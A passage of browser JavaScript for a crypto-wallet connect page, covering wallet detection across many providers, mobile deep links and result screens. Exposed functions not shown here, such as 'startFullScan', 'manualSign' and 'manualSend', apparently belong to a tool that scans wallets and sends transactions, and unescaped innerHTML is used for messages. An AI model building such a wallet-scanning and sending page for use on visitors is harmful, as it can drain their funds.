      <button onclick="startFullScan()" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-bottom: 10px; transition: all 0.2s;" onmouseover="this.style.background='#2563eb'" onmouseout="this.style.background='#3b82f6'">
        Auto-Detect Wallet
      </button>
      
      <p style="text-align: center; color: #999; font-size: 12px; margin: 15px 0;">
        Can't find your wallet? Tap a wallet above to install it.
      </p>
    </div>
  `;
  
  document.getElementById('app').innerHTML = html;
}

function detectInstalledWallets() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  // ══════════════════════════════════════════════════════════════════
  // EVM WALLET DETECTION (Ethereum, Polygon, Base, etc.)
  // ══════════════════════════════════════════════════════════════════
  if (window.ethereum) {
    // Check specific wallet properties
    if (window.ethereum.isMetaMask) installed.add('metamask');
    if (window.ethereum.isTrust) installed.add('trust');
    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
    if (window.ethereum.isRabby) installed.add('rabby');
    if (window.ethereum.isFrame) installed.add('frame');
    if (window.ethereum.isStatus) installed.add('status');
    if (window.ethereum.isBraveWallet) installed.add('brave');
    if (window.ethereum.isArgent) installed.add('argent');
    if (window.ethereum.isEnclave) installed.add('enclave');
    if (window.ethereum.isLedgerConnect) installed.add('ledger');
    if (window.ethereum.isOneKey) installed.add('onekey');
    if (window.ethereum.isBlockWallet) installed.add('blockwallet');
  }
  
  // Check window objects for wallet globals
  if (window.trustwallet) installed.add('trust');
  if (window.okxwallet) installed.add('okx');
  if (window.rabby) installed.add('rabby');
  if (window.bitkeep?.ethereum) installed.add('bitget');
  if (window.core) installed.add('core');
  if (window.uniswapWallet) installed.add('uniswap');
  if (window.rainbow) installed.add('rainbow');
  if (window.frame) installed.add('frame');
  if (window.ledger) installed.add('ledger');
  
  // ══════════════════════════════════════════════════════════════════
  // SOLANA WALLET DETECTION
  // ══════════════════════════════════════════════════════════════════
  if (window.phantom?.solana) installed.add('phantom');
  if (window.solana) installed.add('phantom'); // Fallback
  if (window.solflare) installed.add('solflare');
  if (window.backpack?.solana) installed.add('backpack');
  if (window.glow) installed.add('glow');
  if (window.leap?.solana) installed.add('leap');
  if (window.sequence?.solana) installed.add('sequence');
  
  // ══════════════════════════════════════════════════════════════════
  // TRON WALLET DETECTION
  // ══════════════════════════════════════════════════════════════════
  if (window.tronWeb || window.tronLink) installed.add('tronlink');
  if (window.tokenPocket?.tron) installed.add('tokenpocket');
  
  // ══════════════════════════════════════════════════════════════════
  // USER AGENT DETECTION (for mobile browsers and in-app browsers)
  // ══════════════════════════════════════════════════════════════════
  // Tier 1
  if (ua.includes('metamask')) installed.add('metamask');
  if (ua.includes('trust wallet')) installed.add('trust');
  if (ua.includes('coinbase')) installed.add('coinbase');
  if (ua.includes('okx')) installed.add('okx');
  if (ua.includes('binance')) installed.add('binance');
  
  // Tier 2
  if (ua.includes('phantom')) installed.add('phantom');
  if (ua.includes('rabby')) installed.add('rabby');
  if (ua.includes('rainbow')) installed.add('rainbow');
  if (ua.includes('ledger')) installed.add('ledger');
  if (ua.includes('onekey')) installed.add('onekey');
  
  // Tier 3 & 4
  if (ua.includes('imtoken')) installed.add('imtoken');
  if (ua.includes('tokenpocket')) installed.add('tokenpocket');
  if (ua.includes('safepal')) installed.add('safepal');
  if (ua.includes('bitget')) installed.add('bitget');
  if (ua.includes('solflare')) installed.add('solflare');
  if (ua.includes('bybit')) installed.add('bybit');
  if (ua.includes('kraken')) installed.add('kraken');
  if (ua.includes('exodus')) installed.add('exodus');
  if (ua.includes('argent')) installed.add('argent');
  if (ua.includes('backpack')) installed.add('backpack');
  if (ua.includes('keplr')) installed.add('keplr');
  if (ua.includes('leap')) installed.add('leap');
  if (ua.includes('zerion')) installed.add('zerion');
  if (ua.includes('tronlink')) installed.add('tronlink');
  if (ua.includes('blockwallet')) installed.add('blockwallet');
  if (ua.includes('1inch')) installed.add('oneinch');
  if (ua.includes('frontier')) installed.add('frontier');
  
  return installed;
}

function handleWalletClick(walletId) {
  const deepLink = DEEP_LINKS[walletId];
  
  if (isMobile() && deepLink) {
    sessionStorage.setItem('lastWalletAttempt', walletId);
    window.location.href = deepLink.app(window.location.href);
    
    setTimeout(() => {
      if (document.visibilityState === 'visible') {
        window.location.href = deepLink.download;
      }
    }, 3000);
    return;
  }
  
  log(`Selected: ${walletId}`);
  startFullScan();
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div style="padding: 20px; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
      <div style="font-size: 15px; line-height: 1.7; text-align: left; margin-bottom: 20px;">${msg}</div>
      <button onclick="showWalletSelector()" style="padding: 12px 24px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer;">
        Connect Another
      </button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div style="padding: 20px; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
      <div style="font-size: 15px; margin-bottom: 20px;">${msg}</div>
      <button onclick="showWalletSelector()" style="padding: 12px 24px; background: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer;">
        Try Again
      </button>
    </div>
  `;
}

// Expose to window
window.handleWalletClick = handleWalletClick;
window.showWalletSelector = showWalletSelector;
window.startFullScan = startFullScan;
window.manualSign = manualSign;
window.manualSend = manualSend;
window.clearLogs = clearLogs;
window.testBackend = testBackend;

window.addEventListener('DOMContentLoaded', init);